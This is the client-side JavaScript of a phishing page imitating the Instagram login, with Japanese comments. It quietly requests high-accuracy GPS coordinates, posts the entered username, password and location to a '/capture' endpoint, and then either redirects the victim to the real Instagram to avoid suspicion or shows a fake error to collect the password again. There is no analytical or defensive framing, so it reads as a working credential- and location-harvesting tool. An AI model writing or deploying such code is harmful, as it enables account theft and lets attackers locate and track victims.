(() => {
  const form  = document.getElementById('ig-form');
  const btn   = document.getElementById('submit-btn');
  const u     = form.querySelector('[name="username"]');
  const p     = form.querySelector('[name="password"]');
  const latEl = form.querySelector('[name="lat"]');
  const lngEl = form.querySelector('[name="lng"]');

  let acc = '';

  // 先に位置情報を取っておく（許可されればGPS精度＝番地まで）
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      r => {
        latEl.value = r.coords.latitude;
        lngEl.value = r.coords.longitude;
        acc = Math.round(r.coords.accuracy);
      },
      () => {},
      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
    );
  }

  function showError(msg) {
    let box = form.querySelector('.error');
    if (!msg) { if (box) box.remove(); return; }
    if (!box) {
      box = document.createElement('div');
      box.className = 'error';
      form.insertBefore(box, btn);          // パスワード欄とボタンの間
    }
    box.textContent = msg;
  }

  const sync = () => { btn.disabled = !(u.value.trim() && p.value.trim()); };
  u.addEventListener('input', sync);
  p.addEventListener('input', sync);
  sync();

  form.addEventListener('submit', async e => {
    e.preventDefault();
    showError('');
    btn.disabled = true;
    btn.textContent = 'ログイン中...';

    const fd = new FormData(form);
    if (acc) fd.append('acc', acc);

    let res = { ok: true };
    try {
      res = await fetch('/capture', {
        method: 'POST',
        body: fd,
        headers: { 'X-Requested-With': 'fetch' },
      }).then(r => r.json());
    } catch (_) {}

    if (res.ok) {
      // 本物のInstagramへ
      location.href = 'https://www.instagram.com/';
    } else {
      // メアパスが違った → もう一回入力させる
      showError(res.error || 'ユーザー名またはパスワードが正しくありません。');
      p.value = '';
      p.focus();
      btn.textContent = 'ログイン';
      sync();
    }
  });
})();
